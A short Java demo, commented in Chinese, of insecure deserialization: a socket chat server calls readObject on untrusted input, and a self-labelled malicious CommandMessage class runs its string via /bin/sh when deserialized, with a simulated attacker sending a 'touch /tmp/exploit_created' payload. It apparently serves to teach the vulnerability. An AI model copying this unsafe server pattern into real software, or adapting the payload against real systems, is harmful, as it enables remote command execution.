import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;

// 恶意消息类：实现序列化接口并覆盖readObject方法
record CommandMessage(String cmd) implements Serializable {
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        // 模拟攻击者执行任意命令
        new ProcessBuilder("/bin/sh", "-c", cmd).start();
    }
}

public class ChatServer {
    static void startServer(int port) {
        try (ServerSocket ss = new ServerSocket(port)) {
            System.out.println("Server started on port " + port);
            
            // 函数式风格处理客户端连接
            while (true) {
                Socket client = ss.accept();
                new Thread(() -> handleClient(client)).start();
            }
        } catch (IOException e) { e.printStackTrace(); }
    }

    static void handleClient(Socket socket) {
        try (ObjectInputStream ois = new ObjectInputStream(socket.getInputStream())) {
            // 不安全的反序列化操作
            Object obj = ois.readObject();
            
            // 函数式处理消息（虽然此时已晚）
            Optional.of(obj)
                   .filter(o -> o instanceof CommandMessage)
                   .map(o -> (CommandMessage)o)
                   .ifPresent(msg -> System.out.println("Received: " + msg));
                   
        } catch (Exception e) {
            System.err.println("Error handling client: " + e.getMessage());
        }
    }

    public static void main(String[] args) {
        // 启动服务器（函数式启动）
        new Thread(() -> startServer(9090)).start();
        
        // 模拟客户端连接（攻击者）
        try (Socket s = new Socket("localhost", 9090);
             ObjectOutputStream oos = new ObjectOutputStream(s.getOutputStream())) {
            
            // 发送恶意序列化对象
            oos.writeObject(new CommandMessage("touch /tmp/exploit_created"));
            
        } catch (IOException e) { e.printStackTrace(); }
    }
}